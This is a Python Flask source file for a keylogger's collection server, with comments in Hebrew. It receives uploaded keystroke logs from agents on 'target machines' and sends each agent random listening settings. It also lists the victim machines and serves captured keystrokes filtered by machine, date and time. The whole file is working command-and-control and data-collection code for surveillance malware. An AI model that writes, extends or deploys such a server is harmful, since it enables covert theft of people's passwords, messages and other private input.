import os, json, random
from datetime import time as dtime
from flask import Flask, request, jsonify
from flask_cors import CORS
from utils import ptime, hour_from_fname, timekey, write_to_file

app = Flask(__name__)
CORS(app)
LOG_DIR = 'server_logs'

@app.get('/')
def home(): return "KeyLogger Server is Running"

@app.post('/api/notifications')
def notifications():
    file_path = "notifications.json"
    # קורא את הטקסט שנשלח בגוף הבקשה
    notification_text = request.data.decode('utf-8')  # כאן זה הטקסט הגולמי
    if not notification_text:
        return "No data provided", 400  # אם אין טקסט מחזירים שגיאה 400
    # טוען את הקובץ הקיים או יוצר רשימה ריקה
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            alerts = json.load(f)
    else:
        alerts = []
    # מוסיף את ההתראה למערך
    alerts.append(notification_text)
    # שומר חזרה לקובץ
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(alerts, f, ensure_ascii=False, indent=2)

    return jsonify({"status": "success", "added": notification_text}),201

@app.post('/api/upload')
def save_data():
    status_listen = random.randint(0,1)
    if not request.is_json: return jsonify({"error":"Request must be JSON"}), 400
    data = request.get_json()
    settings ={"status_listen":status_listen}                                         # כאן יכנסו כל המשתנים להגדרות לסוכן
    if not data: return jsonify({"data":False, "settings": settings}), 200
    try:
        write_to_file(data, LOG_DIR)
        return jsonify({"data":True, "settings": settings }), 200
    except Exception as e:
        return jsonify({"error":"Failed to save data","details":str(e)}), 500

@app.get('/api/get_target_machines_list')
def get_machines():
    return jsonify(os.listdir(LOG_DIR)) if os.path.exists(LOG_DIR) else jsonify([])

@app.get('/api/get_keystrokes')
def get_keystrokes():
    machine = request.args.get("machine")
    if not machine: return jsonify({"error":"Missing machine"}), 400
    date_str = request.args.get("date")
    start_t = ptime(request.args.get("start")) or dtime(0,0,0)
    end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
    if start_t > end_t: start_t, end_t = end_t, start_t

    folder = os.path.join(LOG_DIR, machine)
    if not os.path.isdir(folder): return jsonify([])

    files = [f for f in os.listdir(folder) if f.endswith('.json')]
    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
    sh, eh = start_t.hour, end_t.hour
    files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
    files.sort()

    out = []
    for f in files:
        p = os.path.join(folder, f)
        try:
            with open(p,'r',encoding='utf-8') as fh: obj = json.load(fh)
        except Exception:
            with open(p,'r',encoding='utf-8') as fh: out.append(fh.read()); continue
        if not isinstance(obj, dict):
            out.append(json.dumps(obj, ensure_ascii=False)); continue
        filtered = {k:v for k,v in obj.items() if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
        if filtered: out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
    return jsonify(out)

if __name__ == '__main__':
    app.run(debug=True, port=5000)